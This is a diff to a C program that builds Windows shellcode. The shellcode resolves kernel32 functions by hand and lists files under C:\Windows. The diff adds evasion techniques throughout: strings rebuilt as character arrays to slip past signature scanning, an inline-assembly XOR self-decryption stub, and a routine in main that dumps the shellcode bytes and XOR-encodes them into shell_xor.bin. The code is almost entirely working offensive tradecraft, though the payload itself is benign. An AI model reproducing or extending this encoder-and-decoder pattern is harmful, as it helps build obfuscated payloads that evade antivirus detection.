@@ -272,16 +272,62 @@ typedef _Null_terminated_* LPSTR, * PSTR;
 typedef int (FAR WINAPI* FARPROC)();
 typedef void* HANDLE;
 
+#define PAGE_EXECUTE_READWRITE  0x40  
+#define near
+#define _W64
+
+typedef unsigned long       DWORD;
+typedef DWORD near* PDWORD;
+typedef _W64 unsigned long ULONG_PTR, * PULONG_PTR;
+typedef ULONG_PTR SIZE_T, * PSIZE_T;
 
 void shellcode() {
-	const char startDir[] = "C:\\Windows\\*";
+	__asm {
+		push eax
+		push edx
+		push ebx
+
+		xor edx, edx
+		add edx, 96
+		mov eax, esp
+		add eax, 43
+		Hassmen:
+			mov ebx, [esp + eax]
+			xor ebx, 0xEEEEEEEE
+			mov[esp + eax], ebx
+			add eax, 4
+			sub edx, 4
+			jnz Hassmen
+
+		pop ebx
+		pop edx
+		pop eax
+	}
+	/*xor edx, edx
+		add edx, 96
+		mov eax, esp
+		add eax, 43
+		ttt:
+	mov ebx, [eax]
+		xor ebx, 0xeeeeeeee
+		mov[eax], ebx
+		add eax, 4
+		sub edx, 4
+		jnz ttt*/
+
+	unsigned short baseString[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'};
+	LPVOID base = getModule((const LPWSTR)baseString);
+
+	const char startDir[] = { 'C',':','\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '*', '\0' };
 	WIN32_FIND_DATAA FindFileData;
 
-	LPVOID base = getModule((const LPWSTR)L"kernel32.dll");
+	const char func1String[] = { 'F', 'i', 'n', 'd', 'F','i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
+	const char func2String[] = { 'F', 'i', 'n', 'd', 'N','e', 'x', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
+	const char func3String[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0' };
 
-	LPVOID func1 = get_func_by_name((HMODULE)base, (LPSTR)"FindFirstFileA");
-	LPVOID func2 = get_func_by_name((HMODULE)base, (LPSTR)"FindNextFileA");
-	LPVOID func3 = get_func_by_name((HMODULE)base, (LPSTR)"FindClose");
+	LPVOID func1 = get_func_by_name((HMODULE)base, (LPSTR)func1String);
+	LPVOID func2 = get_func_by_name((HMODULE)base, (LPSTR)func2String);
+	LPVOID func3 = get_func_by_name((HMODULE)base, (LPSTR)func3String);
 
 	HMODULE(WINAPI * f_FindFirstFileA)
 		(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData) = (HMODULE(WINAPI*)(LPCSTR, LPWIN32_FIND_DATAA))func1;
@@ -295,7 +341,9 @@ void shellcode() {
 	void* hf = f_FindFirstFileA(startDir, &FindFileData);
 	if (hf == INVALID_HANDLE_VALUE) return;
 
-	FILE* file = fopen("infoDir.txt", "w");
+	const char fileString[] = { 'i', 'n', 'f', 'o', 'D', 'i', 'r', '.', 't', 'x', 't', '\0' };
+	const char mode[] = { 'w', '\0' };
+	FILE* file = fopen(fileString, mode);
 
 	int i = 0;
 	do {
@@ -309,12 +357,27 @@ void shellcode() {
 	fclose(file);
 }
 
-
 void shellcodeEND() {}
 
 int main() {
+	//shellcode();
 	FILE* out = fopen("shell.bin", "w");
 	fwrite(shellcode, (int)shellcodeEND - (int)shellcode, 1, out);
 	fclose(out);
+
+	char myXor = 0xEE;
+	int mySize = 591;
+
+	FILE* bin = fopen("shell.bin", "rb");
+	FILE* xorBin = fopen("shell_xor.bin", "wb");
+	unsigned char buf[591];
+
+	fread(buf, sizeof(char), mySize, bin);
+	for (int i = 0; i < mySize; i++)
+		buf[i] ^= myXor;
+
+	fwrite(buf, sizeof(char), mySize, xorBin);
+	fclose(bin);
+	fclose(xorBin);
 	return 0;
 }
